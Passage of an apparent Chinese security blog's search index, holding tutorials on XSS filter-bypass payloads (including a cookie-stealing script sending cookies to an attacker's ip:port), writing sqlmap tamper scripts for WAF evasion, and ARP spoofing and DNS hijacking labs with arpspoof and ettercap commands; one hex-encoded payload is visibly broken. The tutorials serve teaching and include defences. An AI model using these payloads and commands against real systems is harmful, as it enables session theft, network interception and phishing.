class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Cookie</span>盗取</span><br><span class="line">&lt;script&gt;<span class="keyword">var</span> img=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);img.<span class="property">src</span>=<span class="string">&quot;http://ip:port/a?&quot;</span>+<span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;/script&gt;</span><br><span class="line">其中ip和port是攻击机的，攻击机需要在port开启监听</span><br></pre></td></tr></table></figure><h3 id="0x02-无过滤XSS"><a href="#0x02-无过滤XSS" class="headerlink" title="0x02 无过滤XSS"></a>0x02 无过滤XSS</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;details open ontoggle=alert(1)&gt;</span><br><span class="line">&lt;video src onerror=alert(1)&gt;</span><br><span class="line">&lt;audio src onerror=alert(1)&gt;</span><br><span class="line">&lt;button onfocus=alert(1) autofocus&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;svg onload=&quot;javascript:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="0x03-关键字被过滤"><a href="#0x03-关键字被过滤" class="headerlink" title="0x03 关键字被过滤"></a>0x03 关键字被过滤</h3><p>ASCII码绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">49</span>))&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>JS8进制编码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src onerror=top[<span class="string">&#x27;\141\154\145\162\164&#x27;</span>](<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><p>JS16进制编码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src onerror=top[<span class="string">&#x27;\x61\x\x65&#x27;</span>](<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><p>拼接关键字</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;self[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>](<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">parent[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">frames[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">this</span>[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;&lt;script&gt;top[a=<span class="string">&#x27;ert&#x27;</span>,b=<span class="string">&#x27;al&#x27;</span>,b+a](<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;svg onload=location=[&#x27;javas&#x27;,&#x27;cript:a&#x27;,&#x27;lert(1)&#x27;].join(&#x27;&#x27;)&gt;</span><br><span class="line">&lt;svg onload=location=&#x27;javas&#x27;.concat(&#x27;cript:a&#x27;,&#x27;lert(1)&#x27;)&gt;</span><br><span class="line">&lt;img src onerror=&quot;a=&#x27;ale&#x27;;b=&#x27;rt&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="0x04-相关资料"><a href="#0x04-相关资料" class="headerlink" title="0x04 相关资料"></a>0x04 相关资料</h3><p><a href="https://byd.dropsec.xyz/2020/10/12/%E9%95%BF%E4%BA%ADWAF%20XSS%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87%E5%B0%8F%E8%AE%B0/">长亭WAF XSS防护绕过小记</a></p><p><a href="https://wizardforcel.gitbooks.io/owasp-cheat-sheet-zh/content/xss-filter-evasion-cheat-sheet.html">XSS过滤绕过备忘录</a></p><p><a href="http://www.hackdig.com/09/hack-473403.htm">XSS各种姿势的学习和个人重要总结</a></p><p><a href="https://www.freebuf.com/articles/others-articles/262407.html">XSS过滤和拦截绕过常用方法</a></p><p><a href="https://www.freebuf.com/articles/web/255655.html">XSS绕过速查表</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tamper-Sqlmap</title>
      <link href="/article/f7fb60e5.html"/>
      <url>/article/f7fb60e5.html</url>
      
        <content type="html"><![CDATA[<h3 id="tamper-简介"><a href="#tamper-简介" class="headerlink" title="tamper 简介"></a>tamper 简介</h3><p>tamper是SQLMAP提供的用于绕WAF的payload加工脚本，位于sqlmap项目的tamper文件夹中</p><h3 id="tamper-示例结构分析"><a href="#tamper-示例结构分析" class="headerlink" title="tamper 示例结构分析"></a>tamper 示例结构分析</h3><p>下面将通过内置 tamper : escapequotes.py 作为例子分析tamper的结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Slash escape single and double quotes (e.g. &#x27; -&gt; \&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;1&quot; AND SLEEP(5)#&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;1\\\\&quot; AND SLEEP(5)#&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>总共分为四个部分：import、priority、dependencies、tamper<br>import：即导入python库，sqlmap已经内置了很多库，此处导入的便是设置tamper优先级的库<br>__priority__：设置tamper优先级，tamper优先级分为LOWEREST、LOWER、LOW、NORMAL、HIGH、HIGHER、HIGHEST。如果在使用过程中需要用到多个tamper来处理payload，那么将会按照优先级从高到低的顺序来执行<br>dependencies：设置本tamper的使用提示，没有就直接pass<br>tamper：tamper脚本处理payload的核心方法，此处就是将单双引号进行转义</p><h3 id="tamper-编写测试"><a href="#tamper-编写测试" class="headerlink" title="tamper 编写测试"></a>tamper 编写测试</h3><p>编写一个tamper，此tamper将关键字select进行大小写绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replace &#x27;select&#x27; with &#x27;seLeCt&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;select username from users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;seLeCt username from users&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;seLeCt&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP欺骗</title>
      <link href="/article/808383bb.html"/>
      <url>/article/808383bb.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-什么是ARP协议"><a href="#0x00-什么是ARP协议" class="headerlink" title="0x00 什么是ARP协议"></a>0x00 什么是ARP协议</h3><p>ARP（Address Resolution Protocol，地址解析协议）位于TCP&#x2F;IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。以太网（局域网）进行信息传输时，不是根据IP地址进行通信，因为IP地址是可变的，用于通信是不安全的。而MAC地址是网卡的硬件地址，一般出厂后就具有唯一性。ARP协议就是将目标IP地址解析成MAC地址进行验证通信。</p><h3 id="0x01-ARP通信过程"><a href="#0x01-ARP通信过程" class="headerlink" title="0x01 ARP通信过程"></a>0x01 ARP通信过程</h3><p>每台主机都会在自己的ARP高速缓存中建立一个映射表(生存时间10-20分钟)，用于表示IP地址到MAC地址的映射关系。<br>PC1想要和PC2通信，首先PC1会去自己的映射表中查询PC2的MAC地址，如果没查到，PC1就会在本局域网上广播发送一个ARP请求分组，分组主要内容为：我的IP地址是192.168.0.100,MAC地址是00-00-C0-15-AD-18,我想知道IP地址为192.168.0.101的主机(PC2)的MAC地址。<br>在本局域网上的所有主机都会收到该ARP请求分组，别的主机发现请求分组中要查询的IP和自己IP不一致，就会将该分组扔掉，当PC2发现请求分组中要查询的IP和自己一致时，就会收下该请求分组，并向PC1发送ARP响应分组，响应分组主要内容为：我的IP地址是192.168.0.101,MAC地址是08-00-2B-00-EE-0A。此处应注意，响应分组是单播，只会发给PC1，其它主机并不会接收到该分组。<br>PC1收到PC2的响应分组后，就会在其ARP高速缓存中写入PC2的IP地址到MAC地址的映射。</p><h3 id="0x02-ARP协议安全漏洞"><a href="#0x02-ARP协议安全漏洞" class="headerlink" title="0x02 ARP协议安全漏洞"></a>0x02 ARP协议安全漏洞</h3><p>ARP欺骗的根源在于ARP应答处理机制，在ARP协议中规定，对于任何ARP应答都给予信任，没有主动被动确认机制（主动ARP指的是在主动发送ARP请求后在指定时间内收到ARP应答，在请求指定时间外学习的ARP应答都是被动的），因此为伪造ARP应答提供了可乘之机。欺骗者通过轮询各IP地址和MAC地址对应关系并无违规之处，协议规定了对于ARP请求要给予应答。<br>PC和网关被欺骗的直接根源在于被动学习了伪造的ARP应答，如何避免学习伪造ARP应答是防止ARP欺骗的核心。<br>欺骗是分别针对网关和PC的，因为上网是双向流量，网关被欺骗下行数据无法发给PC，PC被欺骗上行数据无法发给网关，所以都会上不了网，只有同时解决网关被欺骗和PC被欺骗，上网才能正常，有不少人误以为只在网关上防止就可以了，这是错误的。还很多时候有人采取重启网关的方式恢复上网，这是因为断电重启后PC、网关都要重新主动学习一次，主动学习是可以学习到正确的映射关系的，所以重启后上网恢复正常，但很有可能过了一段时间后又无法上网了，将网关断电并不是好解决方案。</p><h3 id="0x03-ARP欺骗攻击原理"><a href="#0x03-ARP欺骗攻击原理" class="headerlink" title="0x03 ARP欺骗攻击原理"></a>0x03 ARP欺骗攻击原理</h3><p>这里只研究对PC2进行欺骗，并不对网关进行欺骗，即并不是中间人攻击，此处要达到的效果就是将PC2本来要发给网关的分组发给了攻击机PC1，然后PC1并不会将该分组转给网关，PC1会直接扔掉分组，即PC2不会收到请求的响应，表现为网络中断。</p><p>利用ARP协议的安全漏洞，假设PC1是一台攻击机，当我们知道了受害者PC2的局域网IP地址后，冒充网关(IP:192.168.0.1)，给它发送一个响应分组(并不需要PC2的请求)，其中主要内容为：我的IP地址是192.168.0.1,MAC地址是08-00-2B-00-EE-0A。当PC2收到了该分组，PC2就会将分组中的映射关系更新到自己的映射表中，当PC2想和网关通信时，就会将分组发给PC1,但并不会收到响应，就会出现网络中断。</p><h3 id="0x04-ARP模拟攻击"><a href="#0x04-ARP模拟攻击" class="headerlink" title="0x04 ARP模拟攻击"></a>0x04 ARP模拟攻击</h3><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p>攻击机PC1：kali  ,  IP为192.168.0.101<br>受害者PC2：Windows10,  IP为192.168.0.105<br>网关：IP为192.168.0.1<br>工具：arpspoof</p><p>在ARP欺骗前查看一下受害者的映射表<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191028997.png"><br>此时关于网关的映射为192.168.0.1—-&gt;c8-3a-35-5d-16-60<br>关于攻击机的映射为192.168.0.101—-&gt;00-0c-29-1f-3c-ab</p><p>测试网络情况<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191036453.png"></p><h4 id="kali进行攻击"><a href="#kali进行攻击" class="headerlink" title="kali进行攻击"></a>kali进行攻击</h4><p>查看局域网主机存活情况<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191029965.png"><br>可以看到PC2在线，开始攻击<br>-i指定网卡，-t指定目标主机的IP和网关IP,即截获目标主机发给网关的数据包。<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191032250.png"><br>查看PC2的映射表<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191030213.png"><br>网关的MAC地址已经被修改为攻击机的MAC地址，显然已经攻击成功</p><p>再次测试网络情况<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191034244.png"></p><p>停止攻击等待一段时间后，查询受害者的映射表<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191036503.png"><br>映射表恢复正常，网络正常</p><h3 id="0x05-ARP攻击防御"><a href="#0x05-ARP攻击防御" class="headerlink" title="0x05 ARP攻击防御"></a>0x05 ARP攻击防御</h3><h4 id="网关防御"><a href="#网关防御" class="headerlink" title="网关防御"></a>网关防御</h4><p>授权ARP，授权ARP的原理是摒弃ARP，而是通过DHCP方式来学习各个IP地址和MAC地址的映射关系，端口启动授权ARP后，ARP学习功能自动关闭。其优点是部署方便，只要网关LAN口启动DHCP服务和授权ARP即可，缺点是所有内网PC必须采用DHCP方式获取地址，否则无法上网，对于地址静态设置的内部服务器就不方便了。<br>静态ARP，先通过主动请求或者手动检查每一台PC的IP、MAC地址的映射，即获得一份正确的映射列表，然后通过命令在网关中逐一添加表项，如果收集完整可以在LAN口中关闭ARP学习功能，达到更好效果。优点是可以支持内部PC手工配置地址如内部服务器，缺点也是很明显的，收集工作比较繁杂，PC地址修改后表项失效（因此无法支持DHCP模式），新增加PC后需要添加新的表项。</p><h4 id="PC防御"><a href="#PC防御" class="headerlink" title="PC防御"></a>PC防御</h4><p>PC的任务是访问一些常用地址，如网关，内部服务器，那么PC上也配置这些常用地址的静态ARR就能防止平常上网服务中断，PC有一个缺点是配置静态ARP后无法保存，重启后需要重新配置。注：window PC通过命令行中arp –s 192.168.0.1 00-01-00-01-00-01方式进行静态绑定。</p>]]></content>
      
      
      <categories>
          
          <category> 局域网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DNS劫持</title>
      <link href="/article/cc0e11b5.html"/>
      <url>/article/cc0e11b5.html</url>
      
        <content type="html"><![CDATA[<p>DNS(Domain Name Server，域名服务器)是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名和与之相对应的IP地址的表，以解析消息的域名。<br>当我们在通过网址访问网站时，并不是根据网址中的域名来寻找要请求的服务器，而是会将域名解析为IP地址，根据IP地址来寻找对应服务器。</p><h3 id="0x00-访问网站流程"><a href="#0x00-访问网站流程" class="headerlink" title="0x00 访问网站流程"></a>0x00 访问网站流程</h3><p>在浏览器地址栏输入一个网址时，计算机就会带着该网址中的域名部分去本地计算机的hosts文件中查询该域名对应的IP,如果找到了，则直接访问该IP,如果没找到，则进一步去远程的DNS服务器上找对应域名的IP,找到后访问该IP.</p><h3 id="0x01-DNS劫持原理"><a href="#0x01-DNS劫持原理" class="headerlink" title="0x01 DNS劫持原理"></a>0x01 DNS劫持原理</h3><p>攻击者控制了你的网关或者冒充了你的网关(路由器、交换机、ISP),即先进行了ARP欺骗。当你发送了一个查找域名的IP的请求时，被攻击者拦截，并且返回给你了一个攻击者指定网站的IP,你的浏览器机会把这个IP当作你请求的域名的IP,这时你看到的页面就是攻击者想让你看到的那个页面，常用于钓鱼网站。</p><h3 id="0x02-DNS劫持实验"><a href="#0x02-DNS劫持实验" class="headerlink" title="0x02 DNS劫持实验"></a>0x02 DNS劫持实验</h3><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p>攻击机：kali    IP地址：192.168.0.108<br>受害机：Windows10 IP地址：192.168.0.109<br>服务器：Windows+Phpstudy搭建测试网站 IP地址：192.168.0.101<br>网关：192.168.0.1<br>工具：Ettercap</p><p>攻击前ping百度<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191132343.png"><br>在kali中起一个Apache服务作为钓鱼网站</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure><h4 id="kali进行攻击"><a href="#kali进行攻击" class="headerlink" title="kali进行攻击"></a>kali进行攻击</h4><p>修改Etter配置文件，设置所有域名都解析到钓鱼网站的IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure><p>将文件中的其余内容全部注释，然后增加以下两条记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*   A       192.168.0.101</span><br><span class="line">*   PTR     192.168.0.101</span><br></pre></td></tr></table></figure><p>发起攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -i eth0 -M arp:remote -P dns_spoof /192.168.0.109// /192.168.0.1//</span><br></pre></td></tr></table></figure><p>受害者访问新浪网<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191133705.png"><br>受害者ping百度<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191133404.png"><br>攻击成功，实验到此结束</p><h3 id="0x03-DNS劫持防御"><a href="#0x03-DNS劫持防御" class="headerlink" title="0x03 DNS劫持防御"></a>0x03 DNS劫持防御</h3><p>尽量使用公共DNS服务器<br>定期检查DN设置是否已修改<br>使用复杂的密码重置路由器的默认密码，即不要使用弱口令<br>使用DNS注册器时使用双因素身份验证，及时修补路由器漏洞<br>远离不受信任的网站，避免在此类网站上下载文件<br>如果已被感染，建议删除HOSTS文件的内容并重置Hosts文件</p>]]></content>
      
      
      <categories>
          
          <category> 局域网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
